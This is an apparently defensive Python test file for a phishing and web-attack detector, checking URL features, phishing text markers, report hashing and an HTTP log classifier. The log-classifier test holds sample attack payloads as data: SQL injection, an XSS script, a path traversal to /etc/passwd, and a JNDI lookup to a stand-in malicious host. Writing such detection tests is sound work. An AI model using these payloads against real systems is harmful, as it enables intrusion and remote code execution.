import os
import sys
import unittest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.db.database import Base
from app.db.models import AnalysisRecord, Incident, IncidentReport, SecurityEvent
from app.ml.url_feature_extractor import extract_url_features
from app.ml.text_nlp_pipeline import extract_text_indicators
from app.services.geoip_service import resolve_domain_to_ip, lookup_ip_geolocation
from app.services.threat_intel import query_virustotal_url_reputation, query_google_safebrowsing
from app.services.log_analyzer import analyze_http_log_entry
from app.core.security import generate_sha256_hash
from app.api.v1.analyze import analyze_url, analyze_text, URLAnalysisRequest, TextAnalysisRequest
from app.api.v1.verify import verify_report_integrity, VerificationRequest
from app.api.v1.assistant import security_assistant_chat, ChatRequest

# Setup test DB (isolated in-memory SQLite)
test_engine = create_engine("sqlite:///:memory:", connect_args={"check_same_thread": False})
Base.metadata.create_all(bind=test_engine)
TestSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=test_engine)

class TestPhishGuardAccuracy(unittest.TestCase):

    def setUp(self):
        self.db = TestSessionLocal()

    def tearDown(self):
        self.db.close()

    def test_01_url_feature_extractor(self):
        """Test URL lexical & structural feature extraction accuracy."""
        url = "http://192.168.1.1/paypal.com/login-verify.php?token=992"
        feats = extract_url_features(url)
        self.assertEqual(feats["has_ip"], 1)
        self.assertGreaterEqual(feats["keyword_count"], 2)
        self.assertGreater(feats["entropy"], 3.0)

    def test_02_text_nlp_indicators(self):
        """Test NLP text marker extraction accuracy."""
        text = "URGENT: Your PayPal account has been suspended! Verify password immediately at http://paypal-verify.xyz"
        indicators = extract_text_indicators(text)
        self.assertIn("urgent", indicators["urgency_hits"])
        self.assertIn("paypal", indicators["financial_hits"])
        self.assertIn("password", indicators["credential_hits"])
        self.assertEqual(len(indicators["extracted_urls"]), 1)

    def test_03_domain_resolution_and_geoip(self):
        """Test DNS resolution and GeoIP lookup logic."""
        # Live resolution test
        ip = resolve_domain_to_ip("https://google.com")
        self.assertIsNotNone(ip)
        
        geo = lookup_ip_geolocation(ip)
        self.assertIn("ip", geo)
        self.assertIn("country", geo)

    def test_04_virustotal_and_safebrowsing_simulated(self):
        """Test simulated threat intelligence heuristic fallbacks."""
        vt_clean = query_virustotal_url_reputation("https://wikipedia.org")
        self.assertEqual(vt_clean["positives"], 0)

        vt_susp = query_virustotal_url_reputation("http://paypal-verify-account.xyz")
        self.assertGreater(vt_susp["positives"], 0)

        gsb_susp = query_google_safebrowsing("http://appleid-security-update.top")
        self.assertTrue(gsb_susp["is_flagged"])

    def test_05_url_analysis_endpoint_and_sha256(self):
        """Test full URL analysis pipeline and SHA-256 digest creation."""
        req = URLAnalysisRequest(url="http://192.168.1.100/login-verify-paypal.xyz", model_choice="rf")
        resp = analyze_url(req, db=self.db, current_user=None)
        
        self.assertIn("verdict", resp)
        self.assertIn("integrity_hash", resp)
        self.assertEqual(len(resp["integrity_hash"]), 64) # 64 hex char SHA-256 digest
        self.assertGreater(resp["risk_score"], 50.0)

    def test_06_sha256_verification_engine(self):
        """Test SHA-256 report and analysis integrity verification engine."""
        # 1. Analyze URL to generate DB record
        req = URLAnalysisRequest(url="http://secure-update-bank.top/auth", model_choice="rf")
        resp = analyze_url(req, db=self.db, current_user=None)
        anl_code = resp["analysis_code"]
        anl_hash = resp["integrity_hash"]

        # 2. Verify ANL code without provided hash
        v_req1 = VerificationRequest(lookup_code=anl_code)
        res1 = verify_report_integrity(v_req1, db=self.db)
        self.assertTrue(res1["valid"])
        self.assertEqual(res1["status"], "INTEGRITY_VERIFIED")

        # 3. Verify ANL code with matching provided hash
        v_req2 = VerificationRequest(lookup_code=anl_code, provided_hash=anl_hash)
        res2 = verify_report_integrity(v_req2, db=self.db)
        self.assertTrue(res2["valid"])

        # 4. Verify ANL code with tampered provided hash
        v_req3 = VerificationRequest(lookup_code=anl_code, provided_hash="badhash1234567890abcdef1234567890abcdef1234567890abcdef12345678")
        res3 = verify_report_integrity(v_req3, db=self.db)
        self.assertFalse(res3["valid"])
        self.assertEqual(res3["status"], "TAMPERING_DETECTED")

    def test_07_http_log_classifier(self):
        """Test HTTP security log classification for SQLi, XSS, Path Traversal, RCE."""
        sqli = analyze_http_log_entry("POST", "/login", 401, "Mozilla/5.0", "user=admin' OR '1'='1")
        self.assertTrue(sqli["is_attack"])
        self.assertEqual(sqli["attack_type"], "SQL Injection (SQLi)")

        xss = analyze_http_log_entry("GET", "/search", 200, "Mozilla/5.0", "<script>alert(1)</script>")
        self.assertTrue(xss["is_attack"])
        self.assertEqual(xss["attack_type"], "Cross-Site Scripting (XSS)")

        lfi = analyze_http_log_entry("GET", "/download", 403, "Mozilla/5.0", "../../../../etc/passwd")
        self.assertTrue(lfi["is_attack"])
        self.assertEqual(lfi["attack_type"], "Path Traversal / LFI")

        rce = analyze_http_log_entry("GET", "/api", 500, "Mozilla/5.0", "${jndi:ldap://malicious.com/a}")
        self.assertTrue(rce["is_attack"])
        self.assertEqual(rce["attack_type"], "Zero-Day / Remote Code Execution (RCE)")

    def test_08_ai_assistant_knowledge_base(self):
        """Test AI Assistant knowledge base replies and recommendations formatting."""
        req = ChatRequest(message="How do I defend against SQL Injection?")
        resp = security_assistant_chat(req)
        self.assertTrue(any(k in resp["reply"] for k in ["Prepared Statements", "SQL", "Parameterized"]))
        self.assertTrue(len(resp["reply"]) > 50)
        self.assertTrue(len(resp["recommendations"]) > 0)

if __name__ == "__main__":
    unittest.main()
